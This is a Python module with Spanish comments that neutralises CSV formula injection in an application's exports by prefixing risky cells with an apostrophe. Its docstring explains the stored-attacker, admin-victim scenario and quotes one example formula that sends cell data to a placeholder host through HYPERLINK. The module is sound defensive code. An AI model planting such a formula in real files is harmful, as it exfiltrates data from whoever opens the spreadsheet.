"""Neutraliza la inyección de fórmulas en cualquier CSV que generemos.

Por qué es un módulo y no una función suelta en `server.py`
----------------------------------------------------------
Lo era, y el resultado fue previsible: cuando se arregló BUG-055 se protegió
`/admin/users.csv`, que era el exportador que se estaba mirando, y **el de
liquidaciones de afiliados se quedó fuera** — vive en `affiliate_program.py`,
que no importa nada de `server.py`. Una defensa que sólo alcanza al fichero en
el que se escribió no es una defensa, es una casualidad.

Mismo movimiento que `log_seguro.py` y por el mismo motivo: si la protección
tiene que estar en todas partes, tiene que poder importarse desde todas partes.

El ataque
---------
Una celda que empieza por `=`, `+`, `-`, `@`, tabulador o retorno de carro la
**evalúa la hoja de cálculo al abrirla**. `=HYPERLINK("http://malo/?d="&A1,"ok")`
exfiltra el contenido con un clic, y por DDE se llega a ejecución de comandos.
Entrecomillar no desactiva nada: `csv.writer` ya entrecomilla y la fórmula se
ejecuta igual.

La forma que importa es **atacante almacena / víctima abre**: el dato lo escribe
un usuario cualquiera y el fichero lo abre un administrador, que es quien más
acceso tiene. Vale para el nombre de un usuario y vale, sobre todo, para los
**datos de cobro que el afiliado teclea libremente** y que alguien abre para
pagarle.

El arreglo es anteponer un apóstrofo: la hoja lo trata como «texto literal» y no
lo muestra.
"""
from __future__ import annotations

from typing import Any

# Los seis que disparan evaluación en Excel, LibreOffice y Google Sheets.
PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: Any) -> Any:
    """El valor tal cual, o con un apóstrofo delante si la hoja lo evaluaría.

    No toca lo que no es texto: un número sigue siendo número, y convertirlo a
    cadena rompería el formato de la columna sin proteger de nada.
    """
    if isinstance(value, str) and value and value[0] in PELIGROSOS:
        return "'" + value
    return value


def fila_segura(valores) -> list:
    """Una fila entera saneada. Para `csv.writer.writerow(...)`."""
    return [csv_safe(v) for v in valores]
